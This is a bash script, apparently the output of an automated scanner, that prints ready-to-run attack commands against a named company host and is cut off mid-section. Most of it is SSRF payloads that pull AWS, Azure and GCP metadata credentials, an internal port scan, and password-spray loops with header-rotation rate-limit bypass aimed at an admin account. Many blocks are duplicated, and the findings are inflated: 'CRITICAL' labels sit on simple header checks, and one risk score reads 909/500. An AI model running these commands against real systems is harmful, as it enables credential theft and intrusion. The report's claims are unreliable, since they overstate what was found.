#!/usr/bin/env bash
# APEX_HUNTER v1.0 — PoC Verification: ehub.ejada.com
# Generated : 20260601_020947
# Usage     : bash poc_scripts.sh | grep -A20 'CRITICAL'
# Each block prints the PoC command — copy and run it manually
# Authorized bug-bounty / legal security research ONLY


echo '=============================================================='
echo '[CRITICAL] FULL-CHAIN-POC'
echo 'Full chain PoC — 5 findings chained, 2 attack combos identified'
echo 'CWE: CWE-1035  CVSS: 10.0  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
dig blog.ejada.com +short
dig help.ejada.com +short
dig support.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] ADV-EXPLOIT-CHAIN'
echo 'Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS '
echo 'CWE: CWE-1035  CVSS: 10.0  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
Step 1: curl -sI 'https://ehub.ejada.com/'
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ance
Step 2: curl -sI 'https://ehub.ejada.com/'
Step 3: curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
Step 4: dig blog.ejada.com +short
Step 5: dig help.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AZURE-IMDS-V1-METADATA-URL'
echo 'SSRF → Azure IMDS v1-metadata Chain via ?url'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance%3Fapi-version%3D2021-02-01' -H 'Metadata: true'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AZURE-IMDS-V1-IDENTITY-URL'
echo 'SSRF → Azure IMDS v1-identity Chain via ?url'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2018-02-01%26resource%3Dhttps%3A//management.azure.com/' -H 'Metadata: true'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AZURE-IMDS-V1-SUBSCRIPTIO-URL'
echo 'SSRF → Azure IMDS v1-subscription Chain via ?url'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/instance/compute/subscriptionId%3Fapi-version%3D2021-02-01%26format%3Dtext' -H 'Metadata: true'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AZURE-IMDS-V2-IDENTITY-URL'
echo 'SSRF → Azure IMDS v2-identity Chain via ?url'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# Step 1 — Verify SSRF via OOB:
curl -sk 'https://ehub.ejada.com?url=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'
# Step 2 — Exploit via Azure IMDS:
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/metadata/identity/oauth2/token%3Fapi-version%3D2019-11-01%26resource%3Dhttps%3A//vault.azure.net' -H 'Metadata: true'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AWS-IMDS-V1-CREDS'
echo 'SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/security-credentials/'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AWS-IMDS-V1-ROLE'
echo 'SSRF → AWS IMDS v1-role — IAM Credential Theft Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/meta-data/iam/info'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] AWS-IMDS-V2-TOKEN'
echo 'SSRF → AWS IMDS v2-token — IAM Credential Theft Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# IMDSv1 (no token required):
curl -sk 'https://ehub.ejada.com?url=http%3A//169.254.169.254/latest/api/token'
# IMDSv2 bypass (PUT token first):
TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 'http://169.254.169.254/latest/api/token') && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] GCP-META-SA-TOKEN'
echo 'SSRF → GCP Metadata sa-token — Service Account Token Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] GCP-META-SA-EMAIL'
echo 'SSRF → GCP Metadata sa-email — Service Account Token Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] GCP-META-PROJECT-ID'
echo 'SSRF → GCP Metadata project-id — Service Account Token Chain'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'
# Or direct if host has SSRF:
curl -sk 'http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] CHAIN-CLOUD-TAKEOVER'
echo '[EXPLOIT CHAIN] Cloud Account Takeover via SSRF'
echo 'CWE: CWE-693  CVSS: 9.9  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
# See attack steps above — each step must be verified manually
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] SCORECARD-001'
echo 'Attack Surface Scorecard — Risk Score 539/500 (100%) — CRITICAL'
echo 'CWE: CWE-693  CVSS: 0.0  Category: Risk Scorecard'
echo '=============================================================='
cat <<'APEX_EOF'
# This is a summary scorecard — see individual findings for PoC commands
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] SCORECARD-001'
echo 'Attack Surface Scorecard — Risk Score 564/500 (100%) — CRITICAL'
echo 'CWE: CWE-693  CVSS: 0.0  Category: Risk Scorecard'
echo '=============================================================='
cat <<'APEX_EOF'
# This is a summary scorecard — see individual findings for PoC commands
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] LATERAL-MOVE-MAP-001'
echo 'Lateral Movement Attack Path Map'
echo 'CWE: CWE-284  CVSS: 0.0  Category: Lateral Movement'
echo '=============================================================='
cat <<'APEX_EOF'
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] LATERAL-MOVE-MAP-001'
echo 'Lateral Movement Attack Path Map'
echo 'CWE: CWE-284  CVSS: 0.0  Category: Lateral Movement'
echo '=============================================================='
cat <<'APEX_EOF'
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] LATERAL-MOVE-MAP-001'
echo 'Lateral Movement Attack Path Map'
echo 'CWE: CWE-284  CVSS: 0.0  Category: Lateral Movement'
echo '=============================================================='
cat <<'APEX_EOF'
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] LATERAL-MOVE-MAP-001'
echo 'Lateral Movement Attack Path Map'
echo 'CWE: CWE-284  CVSS: 0.0  Category: Lateral Movement'
echo '=============================================================='
cat <<'APEX_EOF'
# Internal port scan via SSRF (interactsh):
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -sk 'https://ehub.ejada.com/?url=http://10.0.0.1:$port/' 2>&1 |   grep -v 'refused\|timed' && echo "OPEN: $port"
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] SCORECARD-001'
echo 'Attack Surface Scorecard — Risk Score 909/500 (100%) — CRITICAL'
echo 'CWE: CWE-693  CVSS: 0.0  Category: Risk Scorecard'
echo '=============================================================='
cat <<'APEX_EOF'
# This is a summary scorecard — see individual findings for PoC commands
APEX_EOF
echo ''

echo '=============================================================='
echo '[CRITICAL] CLOUD-META-PIVOT-CHAIN-001'
echo 'Cloud Metadata Pivot Chain — Built from 17 SSRF finding(s)'
echo 'CWE: CWE-918  CVSS: 9.9  Category: SSRF → Cloud Pivot'
echo '=============================================================='
cat <<'APEX_EOF'
# See chain steps above — replace SSRF parameter with metadata URLs
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] F-HDR-001'
echo 'Critical Security Headers Missing'
echo 'CWE: CWE-693  CVSS: 5.4  Category: Security Headers'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sI 'https://ehub.ejada.com/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CHAIN-JENKINS-RCE'
echo '[EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement'
echo 'CWE: CWE-693  CVSS: 10.0  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
# See attack steps above — each step must be verified manually
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CHAIN-LFI-RCE'
echo '[EXPLOIT CHAIN] LFI → Log Poison → RCE'
echo 'CWE: CWE-693  CVSS: 9.8  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
# See attack steps above — each step must be verified manually
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CHAIN-AUTH-BYPASS-ADMIN'
echo '[EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil'
echo 'CWE: CWE-693  CVSS: 9.6  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
# See attack steps above — each step must be verified manually
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CHAIN-SUPPLY-CHAIN-SAST'
echo '[EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE'
echo 'CWE: CWE-693  CVSS: 9.3  Category: Exploit Chain'
echo '=============================================================='
cat <<'APEX_EOF'
# See attack steps above — each step must be verified manually
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V1_LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v1/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V2_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v2/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SIGNIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/signin'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-AUTH_TOKEN'
echo 'Credential Stuffing Surface — No Rate Limit at /auth/token'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SESSIONS'
echo 'Credential Stuffing Surface — No Rate Limit at /api/sessions'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V1_LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v1/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V2_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v2/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SIGNIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/signin'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-AUTH_TOKEN'
echo 'Credential Stuffing Surface — No Rate Limit at /auth/token'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SESSIONS'
echo 'Credential Stuffing Surface — No Rate Limit at /api/sessions'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V1_LOGIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v1/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v1/login'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_V2_AUTH'
echo 'Credential Stuffing Surface — No Rate Limit at /api/v2/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/v2/auth'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SIGNIN'
echo 'Credential Stuffing Surface — No Rate Limit at /api/signin'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/signin'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-AUTH_TOKEN'
echo 'Credential Stuffing Surface — No Rate Limit at /auth/token'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/auth/token'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] CREDSTUFF-API_SESSIONS'
echo 'Credential Stuffing Surface — No Rate Limit at /api/sessions'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Auth / Credential Stuffing'
echo '=============================================================='
cat <<'APEX_EOF'
# Password spray (authorized testing only):
for pass in Password1! Welcome1! Summer2024!; do
  curl -sk -X POST 'https://ehub.ejada.com/api/sessions'   -H 'Content-Type: application/json'   -d '{"email":"admin@ejada.com","password":"$pass"}' |   grep -v 'invalid\|error'; done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] RATELIMIT-BYPASS-IPHDR-API_LOGIN'
echo 'Rate Limit Bypass via IP Header Rotation at /api/login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Rate Limiting'
echo '=============================================================='
cat <<'APEX_EOF'
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/api/login' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] RATELIMIT-BYPASS-IPHDR-API_AUTH'
echo 'Rate Limit Bypass via IP Header Rotation at /api/auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Rate Limiting'
echo '=============================================================='
cat <<'APEX_EOF'
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/api/auth' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] RATELIMIT-BYPASS-IPHDR-LOGIN'
echo 'Rate Limit Bypass via IP Header Rotation at /login'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Rate Limiting'
echo '=============================================================='
cat <<'APEX_EOF'
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/login' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[HIGH] RATELIMIT-BYPASS-IPHDR-AUTH'
echo 'Rate Limit Bypass via IP Header Rotation at /auth'
echo 'CWE: CWE-307  CVSS: 7.5  Category: Rate Limiting'
echo '=============================================================='
cat <<'APEX_EOF'
for i in $(seq 1 50); do
  curl -sk -X POST 'https://ehub.ejada.com/auth' -H 'X-Forwarded-For: 1.2.3.$i' -d '{"username":"admin","password":"password$i"}' &
done
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] F-CJ-001'
echo 'Clickjacking Vulnerability'
echo 'CWE: CWE-1021  CVSS: 5.4  Category: Clickjacking'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-BLOG'
echo 'Dangling DNS — blog.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig blog.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-HELP'
echo 'Dangling DNS — help.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig help.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-SUPPORT'
echo 'Dangling DNS — support.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig support.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-DEV'
echo 'Dangling DNS — dev.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig dev.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-STAGING'
echo 'Dangling DNS — staging.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig staging.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-API'
echo 'Dangling DNS — api.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig api.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DANGLE-DNS-BETA'
echo 'Dangling DNS — beta.ejada.com does not resolve'
echo 'CWE: CWE-350  CVSS: 5.4  Category: Subdomain Takeover'
echo '=============================================================='
cat <<'APEX_EOF'
dig beta.ejada.com +short
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] HTTP2-RAPID-RESET'
echo 'HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure'
